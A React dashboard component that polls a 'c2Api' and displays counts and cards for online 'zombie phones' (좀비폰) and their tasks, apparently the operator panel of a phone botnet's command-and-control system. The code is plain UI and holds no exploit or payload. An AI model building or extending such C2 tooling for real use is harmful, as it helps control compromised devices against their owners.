import React, { useEffect, useState } from 'react';
import { Smartphone, Target, CheckCircle, Activity } from 'lucide-react';
import StatCard from '../components/StatCard';
import NodeCard from '../components/NodeCard';
import TaskCard from '../components/TaskCard';
import { c2Api } from '../api/c2Api';

export default function Dashboard() {
  const [nodes, setNodes] = useState([]);
  const [tasks, setTasks] = useState([]);
  const [stats, setStats] = useState({
    total_nodes: 0,
    total_tasks: 0,
    nodes_by_status: { online: 0, offline: 0 },
    tasks_by_status: { completed: 0, running: 0, pending: 0 }
  });
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    loadData();
    const interval = setInterval(loadData, 5000); // Refresh every 5 seconds
    return () => clearInterval(interval);
  }, []);

  const loadData = async () => {
    try {
      const [nodesData, tasksData] = await Promise.all([
        c2Api.getNodes(),
        c2Api.getTasks()
      ]);

      setNodes(nodesData);
      setTasks(tasksData.slice(0, 6)); // Show latest 6 tasks

      // Calculate stats
      const onlineNodes = nodesData.filter(n => n.status === 'online').length;
      const completedTasks = tasksData.filter(t => t.status === 'completed').length;

      setStats({
        total_nodes: nodesData.length,
        total_tasks: tasksData.length,
        nodes_by_status: {
          online: onlineNodes,
          offline: nodesData.length - onlineNodes
        },
        tasks_by_status: {
          completed: completedTasks,
          running: tasksData.filter(t => t.status === 'running').length,
          pending: tasksData.filter(t => t.status === 'pending').length
        }
      });
    } catch (error) {
      console.error('Failed to load data:', error);
    } finally {
      setLoading(false);
    }
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-screen">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary"></div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h2 className="text-3xl font-bold mb-2">대시보드</h2>
        <p className="text-gray-500">좀비폰 네트워크 현황을 한눈에 확인하세요</p>
      </div>

      {/* Stats Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        <StatCard
          title="전체 좀비폰"
          value={stats.total_nodes}
          icon={Smartphone}
          change={`${stats.nodes_by_status.online}개 온라인`}
          trend="up"
        />
        <StatCard
          title="전체 작업"
          value={stats.total_tasks}
          icon={Target}
          change={`${stats.tasks_by_status.running}개 실행중`}
          trend="up"
        />
        <StatCard
          title="완료된 작업"
          value={stats.tasks_by_status.completed}
          icon={CheckCircle}
        />
        <StatCard
          title="활성 노드"
          value={stats.nodes_by_status.online}
          icon={Activity}
        />
      </div>

      {/* Nodes Section */}
      <div>
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-xl font-semibold">온라인 좀비폰</h3>
          <button className="text-sm text-primary hover:text-primary/80">
            전체 보기 →
          </button>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {nodes.filter(n => n.status === 'online').slice(0, 6).map((node) => (
            <NodeCard key={node.node_id} node={node} />
          ))}
          {nodes.filter(n => n.status === 'online').length === 0 && (
            <div className="col-span-3 card p-8 text-center text-gray-500">
              <Smartphone size={48} className="mx-auto mb-4 opacity-50" />
              <p>온라인 상태인 좀비폰이 없습니다</p>
            </div>
          )}
        </div>
      </div>

      {/* Recent Tasks */}
      <div>
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-xl font-semibold">최근 작업</h3>
          <button className="text-sm text-primary hover:text-primary/80">
            전체 보기 →
          </button>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {tasks.map((task) => (
            <TaskCard key={task.task_id} task={task} />
          ))}
          {tasks.length === 0 && (
            <div className="col-span-3 card p-8 text-center text-gray-500">
              <Target size={48} className="mx-auto mb-4 opacity-50" />
              <p>생성된 작업이 없습니다</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
